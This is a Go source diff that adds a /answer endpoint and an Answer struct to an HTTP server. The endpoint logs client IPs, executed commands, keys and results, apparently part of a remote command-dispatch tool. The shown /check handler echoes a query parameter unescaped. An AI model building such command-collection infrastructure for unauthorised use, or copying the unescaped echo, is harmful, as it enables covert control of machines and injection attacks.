@@ -19,6 +19,13 @@ type Contact struct {
 	//manager key also
 	Date string `json:"Date"`
 }
+type Answer struct {
+	IP          string `json:"Ip"`
+	Command     string `json:"Command"`
+	Key_Manager string `json:"Key_Manager"`
+	Key_Client  string `json:"Key_Client"`
+	Result      string `json:"Result"`
+}
 
 func setCommand() {
 
@@ -50,6 +57,28 @@ func setCommand() {
 	}
 }
 
+/*
+	func GetAnswer(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+
+		var Answer Answer
+		err := json.NewDecoder(r.Body).Decode(&Answer)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		fmt.Printf("Answer coming from client: %s \n", Answer.IP)
+		fmt.Printf("\t %s \n", Answer.Command)
+		fmt.Printf("\t %s \n", Answer.Key_Manager)
+		fmt.Printf("\t %s \n", Answer.Key_Client)
+		fmt.Printf("\t %s \n", Answer.Result)
+
+		fmt.Printf("\n")
+	}
+*/
 func main() {
 	startServer()
 }
@@ -60,6 +89,27 @@ func startServer() {
 	})
 	http.HandleFunc("/check", func(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprint(w, r.URL.Query().Get("m"))
+	})
+	http.HandleFunc("/answer", func(w http.ResponseWriter, r *http.Request) {
+		fmt.Printf("\n")
+		if r.Method != http.MethodPost {
+			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+			return
+		}
+
+		var Answer Answer
+		err := json.NewDecoder(r.Body).Decode(&Answer)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		fmt.Printf("Answer coming from client: %s \n", Answer.IP)
+		fmt.Printf("\t %s \n", Answer.Command)
+		fmt.Printf("\t %s \n", Answer.Key_Manager)
+		fmt.Printf("\t %s \n", Answer.Key_Client)
+		fmt.Printf("\t %s \n", Answer.Result)
+
+		fmt.Printf("\n")
 	})
 	http.HandleFunc("/ready", func(w http.ResponseWriter, r *http.Request) {
 		if r.Method != http.MethodPost {
